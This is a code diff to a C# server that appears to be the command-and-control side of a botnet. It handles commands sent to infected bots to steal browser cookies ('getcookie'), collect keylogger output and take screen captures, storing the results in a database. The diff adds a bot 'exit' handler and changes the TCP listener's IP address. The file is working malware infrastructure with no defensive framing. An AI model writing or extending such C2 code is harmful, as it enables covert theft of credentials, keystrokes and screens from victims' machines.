@@ -89,7 +89,7 @@ namespace Server
 
                 string idBot = botActive[0];
                 string ipBotActive = botActive[1];
-               
+
 
                 string command = commandBot[0];
                 string detail = commandBot[1];
@@ -126,11 +126,7 @@ namespace Server
                 }
             }
 
-            if (command == "exit")
-            {
-
-            }
-            else if (command == "getcookie")
+            if (command == "getcookie")
             {
                 isFinished = false;
                 string ms = "cookies?" + detail + "?";
@@ -171,6 +167,18 @@ namespace Server
                 string timeStartClient = receiveMessageSocket(clientSelected.Client);
                 String time = timeStartClient.Trim() + "?" + timeStop.ToString() + "?";
                 readFileAndInsertDB(clientSelected, id, "keylogger", time); // detail thay bằng time
+                isFinished = true;
+
+            }
+            else if (command == "exit")
+            {
+                isFinished = false;
+                string ms = "exit?stop";
+                sendMessageSocket(ms, clientSelected.Client);
+                if (clients.ContainsKey(clientSelected))
+                {
+                    clients.Remove(clientSelected);
+                }
                 isFinished = true;
 
             }
@@ -288,7 +296,7 @@ namespace Server
             }
             else if (command == "getcapture")
             {
-         
+
 
                 List<Task> captureTasks = new List<Task>();
                 isFinished = false;
@@ -441,7 +449,7 @@ namespace Server
 
             // Encode the byte array to Base64
             string base64String = Convert.ToBase64String(imageBytes);
-            Console.WriteLine(base64String);
+            // Console.WriteLine(base64String);
             return base64String;
         }
 
@@ -452,7 +460,7 @@ namespace Server
             {
                 DB.resetCommandBot();
                 DB.resetBotStatus();
-                IPAddress address = IPAddress.Parse("192.168.1.100");
+                IPAddress address = IPAddress.Parse("172.20.10.4");
 
                 TcpListener listener = new TcpListener(address, PORT_NUMBER);
 
